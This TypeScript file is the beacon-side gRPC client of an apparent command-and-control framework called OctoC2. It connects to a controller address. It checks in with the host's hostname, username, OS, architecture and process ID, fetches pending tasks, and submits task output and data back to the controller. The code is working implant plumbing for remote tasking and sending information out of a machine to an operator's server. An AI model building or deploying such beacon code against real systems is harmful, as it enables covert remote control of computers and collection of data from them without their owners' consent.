/**
 * OctoC2 — BeaconGrpcClient
 *
 * Wraps a @grpc/grpc-js channel for the BeaconService RPC calls.
 * Loads the proto definition from the inlined PROTO_DEFINITION string
 * by writing it to a temp file (proto-loader requires a file path).
 */

import * as grpc        from "@grpc/grpc-js";
import * as protoLoader from "@grpc/proto-loader";
import * as protobuf    from "protobufjs";
import { PROTO_DEFINITION }  from "./proto-def.ts";

// ── Internal proto types (keepCase:false → camelCase field names) ─────────────

interface CheckinReq {
  beaconId:  string;
  publicKey: string;
  hostname:  string;
  username:  string;
  os:        string;
  arch:      string;
  pid:       number;
  checkinAt: string;
}

interface ProtoTask {
  id:       string;
  kind:     string;
  argsJson: string;
  issuedAt: string;
}

interface CheckinResp {
  pendingTasks: ProtoTask[];
}

interface SubmitResultReq {
  result: {
    taskId:      string;
    beaconId:    string;
    success:     boolean;
    output:      string;
    data:        string;
    completedAt: string;
    signature:   string;
  };
}

interface SubmitResultResp {
  accepted: boolean;
  message:  string;
}

// Dynamically-loaded service stub — typed minimally
interface BeaconServiceStub extends grpc.Client {
  checkin(
    req:      CheckinReq,
    meta:     grpc.Metadata,
    opts:     grpc.CallOptions,
    callback: (err: grpc.ServiceError | null, res: CheckinResp) => void
  ): grpc.ClientUnaryCall;
  submitResult(
    req:      SubmitResultReq,
    meta:     grpc.Metadata,
    opts:     grpc.CallOptions,
    callback: (err: grpc.ServiceError | null, res: SubmitResultResp) => void
  ): grpc.ClientUnaryCall;
}

// ── BeaconGrpcClient ───────────────────────────────────────────────────────────

export class BeaconGrpcClient {
  private stub: BeaconServiceStub | null = null;

  // ── connect ──────────────────────────────────────────────────────────────────

  async connect(address: string): Promise<void> {
    // Parse the proto definition in-memory to avoid protobufjs's file-fetch path.
    // In Bun compiled binaries, Bun defines XMLHttpRequest globally (web API compat)
    // so protobufjs picks the XHR path for async loads, and util.fs is null for sync
    // loads — both fail on local file paths. Parsing from string avoids all file I/O.
    const root = protobuf.parse(PROTO_DEFINITION).root;
    root.resolveAll();
    const packageDef = protoLoader.fromJSON(root.toJSON(), {
      keepCase:  false,
      longs:     String,
      enums:     String,
      defaults:  true,
      oneofs:    true,
    });

    const proto = grpc.loadPackageDefinition(packageDef) as Record<string, unknown>;
    const pkg   = proto["svc"] as Record<string, grpc.ServiceClientConstructor>;
    const BeaconService = pkg["BeaconService"];
    if (!BeaconService) throw new Error("gRPC package definition missing BeaconService");

    // Detect HTTPS URLs (Codespace public forwarded port or cloud gRPC endpoint).
    // Strip the scheme and default to port 443 for the gRPC target address.
    let target: string;
    let creds: grpc.ChannelCredentials;
    if (address.startsWith("https://")) {
      const url = new URL(address);
      target = `${url.hostname}:${url.port || "443"}`;
      creds  = grpc.credentials.createSsl();
    } else {
      target = address;
      creds  = grpc.credentials.createInsecure();
    }

    this.stub = new BeaconService(target, creds) as unknown as BeaconServiceStub;
  }

  // ── checkin ──────────────────────────────────────────────────────────────────

  checkin(req: CheckinReq): Promise<CheckinResp> {
    return new Promise((resolve, reject) => {
      const opts: grpc.CallOptions = { deadline: new Date(Date.now() + 30_000) };
      this.stub!.checkin(req, new grpc.Metadata(), opts, (err, res) => {
        if (err) return reject(err);
        resolve(res);
      });
    });
  }

  // ── submitResult ─────────────────────────────────────────────────────────────

  submitResult(req: SubmitResultReq): Promise<SubmitResultResp> {
    return new Promise((resolve, reject) => {
      const opts: grpc.CallOptions = { deadline: new Date(Date.now() + 30_000) };
      this.stub!.submitResult(req, new grpc.Metadata(), opts, (err, res) => {
        if (err) return reject(err);
        resolve(res);
      });
    });
  }

  // ── close ─────────────────────────────────────────────────────────────────────

  close(): void {
    if (this.stub) {
      (this.stub as unknown as grpc.Client).close();
      this.stub = null;
    }
  }
}
